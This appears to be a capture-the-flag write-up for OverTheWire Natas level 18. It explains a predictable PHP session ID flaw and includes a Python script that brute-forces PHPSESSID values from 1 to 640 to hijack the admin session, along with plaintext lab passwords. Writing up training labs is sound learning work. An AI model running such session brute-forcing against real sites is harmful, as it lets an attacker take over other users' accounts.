- This level will test our skills of reading code and understanding how sessions work in PHP
- So we have the following mimic source code:
```php
<?php
$maxid = 640; // 640 should be enough for everyone
function isValidAdminLogin() { /* {{{ */
	if ($_REQUEST["username"] == "admin") {
	/* This method of authentication appears to be unsafe and has been disabled for now. */
	//return 1;
	}
	return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
	return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
	global $maxid;
	return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
	if (array_key_exists("debug", $_GET)) {
		print "DEBUG: $msg<br>";
	}
}
/* }}} */
function my_session_start() { /* {{{ */
if (array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
	if (!session_start()) {
		debug("Session start failed");
		return false;
	} else {
	debug("Session start ok");
	if (!array_key_exists("admin", $_SESSION)) {
		debug("Session was old: admin flag set");
		$_SESSION["admin"] = 0; // backwards compatible, secure
	}
	return true;
	}
}
return false;
}

/* }}} */
function print_credentials()
{ /* {{{ */
	if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
	print "You are an admin. The credentials for the next level are:<br>";
	print "<pre>Username: natas19\n";
	print "Password: <censored></pre>";
} else {
print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
}
}
/* }}} */
$showform = true;
if (my_session_start()) {
	print_credentials();
	$showform = false;
} else {
if (array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
	session_id(createID($_REQUEST["username"]));
	session_start();
	$_SESSION["admin"] = isValidAdminLogin();
	debug("New session started");
	$showform = false;
	print_credentials();
}
}
?>
```
- So there's a lot of code in here to absorb, however if we look closely, we can find that the working code is present at the bottom
- The ```showform``` variable is just used to show or hide the form, and it isn't of that use to us
- Inside the ```if else``` block, we can see that the function ```my_session_start()``` is being checked and on the basis of its return value, the method ```print_credentials()``` is called in either of the blocks
- Inside the ```print_credentials()``` method, we can observe that the credentials of next level are printed only if the value of the session variable ```$_SESSION['admin']``` equals ```1```
- However, there is no code that actually sets this value to ```1```. The code only sets it to ```0``` no matter what the logic is
- From the knowledge of PHP sessions, we also know that the session variables are used to store information about the client sending request, since every HTTP request is stateless so the server can't keep track of the user. Sessions are used to present dynamic, tailored content per client and to keep track of the session, a cookie is sent to the client with the property ```PHPSESSID```
- Now since the client cannot modify the session variables on the server directly, we cannot control them entirely through the HTTP requests
- However, every session is stored on the server with a unique id that is mapped with the ```PHPSESSID``` that the client sends it to the server and corresponding to it the session is started
- So if we can find out the session id of the authenticated user, we can crack the level
- So how to guess the session id? Well, in the code we can have a look at the ```createID()``` method call that generates a unique random ID for each client. However, the random number lies between ```1``` and ```640``` which we can easily bruteforce
- So we write a python script that will go through all these 640 values and try to find out if the client is authenticated
- I wrote the following script for this purpose:
```python
import requests
from requests.auth import HTTPBasicAuth
URL = "http://natas18.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
FAILURE_TEXT = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."
for i in range(1, 641):
	cookie = { 'PHPSESSID' : f"{i}" }
	r = requests.post(URL, cookies=cookie, auth=auth)
	print(f"Trying session id: {i}")
	if FAILURE_TEXT not in r.text:
		print(f"Session ID found: {i}")
		print(r.text)
		break
```
- The script tries out every session id from 1 to 640 and checks if the text ```You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.``` is present in the response or not. If the text is not present in the response, this means we ```predicted``` the session and hence got access to it
- Obtained password for this level: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr